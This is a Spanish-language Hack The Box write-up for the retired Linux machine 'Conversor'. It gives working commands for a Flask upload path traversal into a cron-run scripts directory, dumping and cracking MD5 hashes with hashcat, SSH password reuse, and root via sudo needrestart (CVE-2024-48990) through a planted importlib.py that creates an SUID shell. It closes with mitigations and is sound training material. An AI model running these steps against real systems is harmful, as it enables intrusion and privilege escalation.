---
machine: Conversor
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, flask, path-traversal, cron, sqlite, needrestart]
---

# Conversor — Hack The Box (Linux)

[🌐 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Una aplicación Flask permite subir XML y XSLT. El nombre del archivo se pasa a `os.path.join` sin `secure_filename`, así que un nombre absoluto escribe fuera del directorio de subidas. Un cron ejecuta todos los `.py` del directorio de scripts y da RCE. La base SQLite contiene hashes MD5; la contraseña se reutiliza por SSH y `needrestart` permite root.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p22,80 <IP>
```

- OpenSSH y Apache 2.4.52.
- `conversor.htb` redirige a `/login`.
- La aplicación es Flask con registro y sesión.

## Enumeración

- El registro permite crear una cuenta.
- El panel ofrece `/convert` con dos campos: `xml_file` y `xslt_file`.
- Los archivos se guardan en disco antes de parsearlos; un XML inválido revela la ruta guardada.

## Foothold

El código usa `os.path.join(UPLOAD_DIR, filename)`. En Python, un segundo argumento absoluto descarta el primero. Se envía un `filename` que apunta a `/var/www/conversor.htb/scripts/p0c.py` y se escribe un script Python.

```python
files = {
    "xml_file": ("/var/www/conversor.htb/scripts/p0c.py", open("payload.py", "rb")),
    "xslt_file": ("stub.xslt", open("stub.xslt", "rb")),
}
```

Un cron ejecuta cada minuto todos los `.py` de ese directorio. El script se ejecuta como `www-data`.

```bash
* * * * * for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

## Movimiento lateral

La base `instance/users.db` contiene hashes MD5 sin sal. El hash de `fismathack` se crackea con `hashcat -m 0` y la contraseña funciona por SSH.

```bash
sqlite3 instance/users.db 'select username,password from users;'
hashcat -m 0 fismathack.hash /usr/share/wordlists/rockyou.txt
ssh fismathack@conversor.htb
```

## Escalada de privilegios

`sudo -l` permite ejecutar `needrestart` sin contraseña. La herramienta evalúa su configuración como Perl y también carga módulos Python desde el entorno. Se crea un `importlib.py` malicioso en `/tmp`, se lanza un proceso con `PYTHONPATH` y se invoca `sudo needrestart`; el módulo se importa con privilegios de root.

```bash
mkdir /tmp/x
printf 'import os\nos.system("cp /bin/bash /tmp/rb; chmod +s /tmp/rb")\n' > /tmp/x/importlib.py
PYTHONPATH=/tmp/x python3 -c 'import time; time.sleep(3600)' &
sudo needrestart
/tmp/rb -p
```

## Evidencia

- Petición de subida con nombre absoluto.
- Archivo escrito en `scripts/` y ejecución por cron.
- Hash MD5 crackeado y acceso SSH.
- Regla `sudo`, módulo Python y binario SUID.
- Flag redactada.

## Lecciones aprendidas

- `os.path.join` no es una barrera de seguridad.
- Un cron que ejecuta todo un directorio convierte cualquier escritura en RCE.
- Los hashes MD5 sin sal caen con un diccionario.

## Mitigaciones y detección

- Usar `secure_filename` y validar que la ruta final permanezca en el directorio de subidas.
- No ejecutar scripts de un directorio escribible por el servicio web.
- Sustituir MD5 por Argon2 o bcrypt y no reutilizar contraseñas.
- Restringir `needrestart` en `sudo` y auditar cambios en su configuración.

## Referencias

- <https://www.hackthebox.com/machines/Conversor>
- <https://nvd.nist.gov/vuln/detail/CVE-2024-48990>
- <https://docs.python.org/3/library/os.path.html#os.path.join>
- <https://attack.mitre.org/techniques/T1059/006/>
